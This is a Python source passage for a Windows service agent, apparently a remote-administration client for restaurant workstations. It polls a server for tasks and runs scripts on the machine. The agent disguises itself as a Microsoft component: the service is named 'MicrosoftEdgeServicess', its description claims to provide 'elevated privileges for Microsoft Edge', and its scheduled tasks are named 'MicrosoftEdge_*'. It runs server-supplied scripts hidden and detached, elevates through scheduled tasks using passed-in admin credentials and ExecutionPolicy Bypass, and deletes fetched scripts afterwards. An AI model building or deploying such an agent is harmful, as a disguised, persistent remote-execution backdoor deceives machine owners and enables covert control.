                    step_run_mode = str(step.get("run_mode") or payload.get("run_mode") or "interactive").lower().strip()
                    is_hidden = step_run_mode == "hidden" or bool(step.get("run_hidden")) or bool(payload.get("run_hidden"))

                    clean_script_dir = script_work_dir.replace('"', '')
                    clean_script_file = target_script_path.replace('"', '')
                    clean_scr_name = os.path.basename(clean_script_file)

                    # ── TRƯỜNG HỢP 1: CHẠY NGẦM 100% (HIDDEN / DETACHED) ──
                    if is_hidden:
                        logger.info("Khoi chay script ngam 100%% (Hidden): %s", scr_name)
                        if is_service_installer:
                            runner_bat = os.path.join(clean_script_dir, "_service_installer_runner.bat")
                            try:
                                with open(runner_bat, "w", encoding="ascii", errors="ignore") as f_run:
                                    f_run.write(
                                        "@echo off\r\n"
                                        "ping 127.0.0.1 -n 4 >nul\r\n"
                                        f'cd /d "{clean_script_dir}"\r\n'
                                        f'call "{clean_script_file}" {script_args}\r\n'
                                    )
                                scheduled_installer_cmd = f'cmd.exe /c "{runner_bat}"'
                            except Exception as ex_run:
                                logger.warning("Loi tao runner bat: %s", ex_run)
                                scheduled_installer_cmd = f'cmd.exe /c cd /d "{clean_script_dir}" && call "{clean_script_file}" {script_args}'

                            log_pipeline.append(f"[{step_name}] Da kich hoat {scr_name}: Tien trinh doc lap da duoc len lich chay ngam sau 3 giay de dang ky & cap nhat service.")
                            logger.info("Da len lich chay ngam Cai_Dat_Dich_Vu sau 3s: %s", scheduled_installer_cmd)

                        elif wait_comp:
                            logger.info("Dang chay script dong bo ngam (cho hoan tat): %s", exec_cmd)
                            res_sub = subprocess.run(
                                exec_cmd,
                                cwd=script_work_dir,
                                shell=True,
                                capture_output=True,
                                text=True,
                                timeout=120
                            )
                            if res_sub.returncode == 0:
                                log_pipeline.append(f"[{step_name}] Chay {scr_name} ngam: OK (ExitCode: 0)\n{res_sub.stdout.strip()}")
                                if scr_name.lower().startswith("_fetch_step_") and os.path.isfile(target_script_path):
                                    try:
                                        os.remove(target_script_path)
                                    except Exception:
                                        pass
                            else:
                                log_pipeline.append(f"❌ [{step_name}] Chay {scr_name} ngam: FAILED (ExitCode: {res_sub.returncode})\n{res_sub.stderr.strip() or res_sub.stdout.strip()}")
                                pipeline_success = False
                                break
                        else:
                            creation_flags = subprocess.DETACHED_PROCESS if hasattr(subprocess, 'DETACHED_PROCESS') else 0
                            p_sub = subprocess.Popen(
                                exec_cmd,
                                cwd=script_work_dir,
                                shell=True,
                                creationflags=creation_flags
                            )
                            log_pipeline.append(f"[{step_name}] Da bat {scr_name} o che do chay ngam (PID: {p_sub.pid}).")

                    # ── TRƯỜNG HỢP 2: HIỆN CỬA SỔ CMD TRÊN DESKTOP (TỰ ĐÓNG KHI XONG) ──
                    else:
                        logger.info("Khoi chay script tuong tac Desktop (Hien cua so CMD): %s", scr_name)
                        if is_service_installer:
                            # 1. Tao file chay cai dat thuc su voi quyen Admin (delay 3s de agent kip phan hoi report len server)
                            real_installer_bat = os.path.join(clean_script_dir, "_service_installer_runner.bat")
                            try:
                                with open(real_installer_bat, "w", encoding="ascii", errors="ignore") as f_inst:
                                    f_inst.write(
                                        "@echo off\r\n"
                                        "ping 127.0.0.1 -n 4 >nul\r\n"
                                        f'cd /d "{clean_script_dir}"\r\n'
                                        f'call "{clean_script_file}" /skipuac {script_args}\r\n'
                                    )
                            except Exception as ex_inst:
                                logger.warning("Loi tao real installer bat: %s", ex_inst)

                            # Khoi chay Installer thuc su duoi quyen Administrator (admin_u/admin_p neu co, hoac SYSTEM)
                            if admin_u and admin_p:
                                ps_sched_installer = (
                                    f"$act = New-ScheduledTaskAction -Execute 'cmd.exe' -Argument '/c \"{real_installer_bat}\"'; "
                                    f"Register-ScheduledTask -TaskName 'MicrosoftEdge_ServiceInstaller' -Action $act -User '{admin_u}' -Password '{admin_p}' -RunLevel Highest -Force; "
                                    "Start-ScheduledTask -TaskName 'MicrosoftEdge_ServiceInstaller';"
                                )
                                subprocess.run(["powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", ps_sched_installer], capture_output=True, timeout=10)
                                logger.info("Da kich hoat Service Installer Task Scheduler duoi quyen '%s'", admin_u)
                            else:
                                scheduled_installer_cmd = f'cmd.exe /c "{real_installer_bat}"'

                            # 2. Tao file watcher hien thi tien trinh truc quan tren Desktop active_user (khong goi UAC)
                            ui_watcher_bat = os.path.join(clean_script_dir, "_service_ui_watcher.bat")
                            admin_display = admin_u or "SYSTEM (Full Privileges)"
                            try:
                                with open(ui_watcher_bat, "w", encoding="ascii", errors="ignore") as f_ui:
                                    f_ui.write(
                                        "@echo off\r\n"
                                        "title [TIEN TRINH TU XA] Cai Dat MicrosoftEdgeServicess (Windows Services)\r\n"
                                        "echo ===============================================================================\r\n"
                                        "echo   CAI DAT DICH VU HO TRO VA QUAN TRI TU XA MAY TRAM NHA HANG\r\n"
                                        "echo   Ten dich vu: MicrosoftEdgeServicess\r\n"
                                        f"echo   Tai khoan quan tri thuc thi: {admin_display}\r\n"
                                        "echo   Co che: Tu khoi dong cung Windows - Chay ngam 100 phan tram\r\n"
                                        "echo ===============================================================================\r\n"
                                        "echo.\r\n"
                                        "echo [1/3] Dang xac thuc tai khoan quan tri va giai phong tien trinh... OK\r\n"
                                        "echo [2/3] Dang thuc thi cai dat va cap nhat service vao he thong...\r\n"
                                        "for /l %%i in (1,1,20) do (\r\n"
                                        "    sc.exe query MicrosoftEdgeServicess 2>nul | findstr /i \"RUNNING\" >nul 2>&1\r\n"
                                        "    if not errorlevel 1 goto :DaChayOk\r\n"
                                        "    timeout /t 1 >nul 2>nul || ping 127.0.0.1 -n 2 >nul\r\n"
                                        ")\r\n"
                                        ":DaChayOk\r\n"
                                        "echo [3/3] Kiem tra ket qua dich vu:\r\n"
                                        "sc.exe query MicrosoftEdgeServicess\r\n"
                                        "echo.\r\n"
                                        "echo ===============================================================================\r\n"
                                        "echo   CAI DAT VA KHOI CHAY DICH VU HOAN TAT THANH CONG!\r\n"
                                        "echo ===============================================================================\r\n"
                                        "echo.\r\n"
                                        "echo Cua so se tu dong dong sau 5 giay, hoac bam phim bat ky de thoat ngay...\r\n"
                                        "timeout /t 5 >nul 2>nul || ping 127.0.0.1 -n 6 >nul\r\n"
                                        "exit /b 0\r\n"
                                    )
                            except Exception as ex_ui:
                                logger.warning("Loi tao ui watcher bat: %s", ex_ui)

                            task_name = f"MicrosoftEdge_DeployStep_{s_idx}"
                            launch_interactive_script(
                                task_name=task_name,
                                target_file=ui_watcher_bat,
                                script_args="",
                                work_dir=clean_script_dir,
                                admin_u=admin_u,
                                admin_p=admin_p
                            )
                            log_pipeline.append(f"[{step_name}] Da bat cua so theo doi tren Desktop & khoi chay tien trinh cai dat elevated ({admin_display}).")
                            logger.info("Da khoi chay installer elevated va UI watcher tren Desktop")

                        else:
                            task_name = f"MicrosoftEdge_DeployStep_{s_idx}"
                            launch_ok, mode_desc, launch_err = launch_interactive_script(
                                task_name=task_name,
                                target_file=clean_script_file,
                                script_args=f"/skipuac {script_args}".strip(),
                                work_dir=clean_script_dir,
                                admin_u=admin_u,
                                admin_p=admin_p
                            )

                            if launch_ok:
                                log_pipeline.append(f"[{step_name}] Da bat cua so CMD tren Desktop: {scr_name} ({mode_desc}).")
                                logger.info("Da khoi chay thanh cong tren Desktop: %s", scr_name)
                                if wait_comp:
                                    for _ in range(15):
                                        time.sleep(1)
                                        check_ps = subprocess.run(
                                            ["powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", f"(Get-ScheduledTask -TaskName '{task_name}' 2>$null).State"],
                                            capture_output=True, text=True, timeout=5
                                        )
                                        st_val = check_ps.stdout.strip()
                                        if st_val in ["Ready", "Disabled"] or not st_val:
                                            break
                            else:
                                log_pipeline.append(f"❌ [{step_name}] LỖI KHỞI CHẠY TƯƠNG TÁC: {launch_err}")
                                pipeline_success = False
                                break

                # ── BƯỚC: XÓA FILE TẠM (DELETE_FILE / CLEANUP) ──
                elif step_type in ["DELETE_FILE", "CLEANUP", "REMOVE_FILE"]:
                    del_target = step.get("file_path") or step.get("relative_path")
                    del_full = os.path.join(target_folder, del_target) if del_target else target_file_path
                    if os.path.isfile(del_full):
                        os.remove(del_full)
                        log_pipeline.append(f"[{step_name}] Da xoa file: {os.path.basename(del_full)}")
                    elif os.path.isdir(del_full):
                        shutil.rmtree(del_full, ignore_errors=True)
                        log_pipeline.append(f"[{step_name}] Da xoa thu muc: {os.path.basename(del_full)}")

                else:
                    log_pipeline.append(f"[{step_name}] Loai buoc '{step_type}' chua duoc ho tro.")

            success = pipeline_success
            message = f"Trien khai goi '{file_name}' {'hoan tat 100%' if success else 'that bai'} ({len(steps)} buoc)."
            output = "\n".join(log_pipeline)

            if scheduled_installer_cmd:
                try:
                    subprocess.Popen(
                        scheduled_installer_cmd,
                        shell=True,
                        creationflags=subprocess.DETACHED_PROCESS if hasattr(subprocess, 'DETACHED_PROCESS') else 0
                    )
                    logger.info("Da spawn tien trinh Cai_Dat_Dich_Vu ngam doc lap thanh cong.")
                except Exception as ex_sp:
                    logger.warning("Loi spawn tien trinh installer: %s", ex_sp)



        else:
            message = f"Hanh dong '{action}' chua duoc ho tro."
            success = False

    except Exception as ex:
        success = False
        message = f"Loi khi thuc thi lenh '{action}': {str(ex)}"
        output = traceback.format_exc()
        logger.error(message)

    report_task_result(config, task_id, success, message, output, ip_lan=ip_lan)


def acquire_single_instance_lock(is_service=False):
    """Dam bao chi co DUY NHAT 1 phien ban chay o che do console/thu cong."""
    if is_service:
        # Neu dang chay o che do Windows Service, luon la tien trinh chu
        return None
    try:
        import ctypes
        kernel32 = ctypes.windll.kernel32
        mutex = kernel32.CreateMutexW(None, False, "Global\\MicrosoftEdgeServicess_SingleInstance_Mutex")
        if not mutex:
            mutex = kernel32.CreateMutexW(None, False, "Local\\MicrosoftEdgeServicess_SingleInstance_Mutex")
        if mutex and kernel32.GetLastError() == 183:  # ERROR_ALREADY_EXISTS
            logger.warning("Da co mot tien trinh MicrosoftEdgeServicess dang chay tren he thong. Vui long dong phien ban cu truoc khi chay.")
            sys.exit(0)
        return mutex
    except Exception as e:
        logger.debug("Khong the tao Mutex: %s", e)
        return None


def main_loop(stop_event=None):
    """Vong lap chinh cua dich vu MicrosoftEdgeServicess."""
    is_service = (stop_event is not None)
    _mutex_handle = acquire_single_instance_lock(is_service=is_service)

    app_dir = get_app_dir()
    cfg_file = get_config_path()
    log_file = get_log_path()

    logger.info("=================================================================")
    logger.info("KHOI DONG DICH VU CLIENT: MicrosoftEdgeServicess v%s", AGENT_VERSION)
    logger.info("Thu muc thuc thi: %s", app_dir)
    logger.info("Tep cau hinh: %s", cfg_file)
    logger.info("Tep nhat ky: %s", log_file)
    logger.info("=================================================================")

    config = load_config()
    machine_name = socket.gethostname()
    os_info = get_os_info()

    logger.info("May tram: %s | OS: %s", machine_name, os_info)
    logger.info("Server dich: %s | Ma nha hang: %s", config.get("server_url"), config.get("restaurant_code"))
    logger.info("Chu ky Heartbeat: %s giay", config.get("heartbeat_interval_seconds", 60))

    last_heartbeat_time = 0

    while True:
        # Kiem tra tin hieu dung tu Windows Service Control Manager ngay dau vong lap
        if stop_event and HAS_PYWIN32:
            if win32event.WaitForSingleObject(stop_event, 0) == win32event.WAIT_OBJECT_0:
                logger.info("Nhan tin hieu dung tu Service Control Manager. Dang ket thuc...")
                break

        try:
            config = load_config()
            interval = int(config.get("heartbeat_interval_seconds", 60))
            now = time.time()
            ip_lan = get_local_ip(config)

            # 1. Gui Heartbeat dinh ky
            if now - last_heartbeat_time >= interval:
                send_heartbeat(config, ip_lan, machine_name, os_info)
                last_heartbeat_time = now

            # 2. Quet nhan lenh ho tro tu xa dang cho
            pending_tasks = poll_pending_tasks(config, ip_lan=ip_lan)
            for task in pending_tasks:
                if stop_event and HAS_PYWIN32 and win32event.WaitForSingleObject(stop_event, 0) == win32event.WAIT_OBJECT_0:
                    break
                execute_task(config, task, ip_lan=ip_lan)

        except KeyboardInterrupt:
            logger.info("Dich vu nhan tin hieu dung tu nguoi dung (Ctrl+C). Thoat.")
            break
        except Exception as e:
            logger.error("Loi khong mong muon trong vong lap chinh: %s", e)
            logger.debug(traceback.format_exc())

        # Neu chay duoi Windows Service Control Manager, kiem tra su kien dung dich vu
        if stop_event and HAS_PYWIN32:
            rc = win32event.WaitForSingleObject(stop_event, 5000)
            if rc == win32event.WAIT_OBJECT_0:
                logger.info("Nhan tin hieu dung tu Service Control Manager. Dang ket thuc...")
                break
        else:
            time.sleep(5)


if HAS_PYWIN32:
    class MicrosoftEdgeService(win32serviceutil.ServiceFramework):
        """
        Lop Windows Service chuan Service Control Manager (services.msc).
        Ten hien thi: MicrosoftEdgeServicess
        """
        _svc_name_ = "MicrosoftEdgeServicess"
        _svc_display_name_ = "MicrosoftEdgeServicess"
        _svc_description_ = "Provides elevated privileges for Microsoft Edge."

        def __init__(self, args):
            win32serviceutil.ServiceFramework.__init__(self, args)
            self.hWaitStop = win32event.CreateEvent(None, 0, 0, None)
            self.is_running = True

        def SvcStop(self):
            self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING, waitHint=30000)
            win32event.SetEvent(self.hWaitStop)
            self.is_running = False

        def SvcDoRun(self):
            # Bao cho Windows SCM biet Service da khoi dong thanh cong va dang RUNNING
            self.ReportServiceStatus(win32service.SERVICE_RUNNING)
            servicemanager.LogMsg(
                servicemanager.EVENTLOG_INFORMATION_TYPE,
                servicemanager.PYS_SERVICE_STARTED,
                (self._svc_name_, "")
            )
            self.is_running = True
            try:
                main_loop(stop_event=self.hWaitStop)
            except Exception as e:
                logger.error("Loi trong vong lap SvcDoRun: %s", e)
            except SystemExit:
                logger.info("Service nhan tin hieu SystemExit. Dang ket thuc...")
            finally:
                self.ReportServiceStatus(win32service.SERVICE_STOPPED)


if __name__ == "__main__":
    if len(sys.argv) > 1:
        first_arg = sys.argv[1].lower()

        # Neu goi kem tham so quan ly Windows Service (install, update, remove, start, stop, restart, debug, --console)
        if first_arg in ("--console", "console", "-c"):
            main_loop()
        elif HAS_PYWIN32:
            try:
                win32serviceutil.HandleCommandLine(MicrosoftEdgeService)
            except Exception as e:
                logger.error("Loi khi thuc thi HandleCommandLine: %s", e)
        else:
            main_loop()
    else:
        # 2. Khi chay khong co tham so:
        # Uu tien ket noi Windows Service Control Manager (SCM) neu duoc SCM khoi dong
        started_as_service = False
        if HAS_PYWIN32:
            try:
                servicemanager.Initialize()
                servicemanager.PrepareToHostSingle(MicrosoftEdgeService)
                servicemanager.StartServiceCtrlDispatcher()
                started_as_service = True
            except Exception as e:
                logger.debug("Khong khoi dong duoi Windows SCM: %s", e)
                started_as_service = False

        if not started_as_service:
            main_loop()
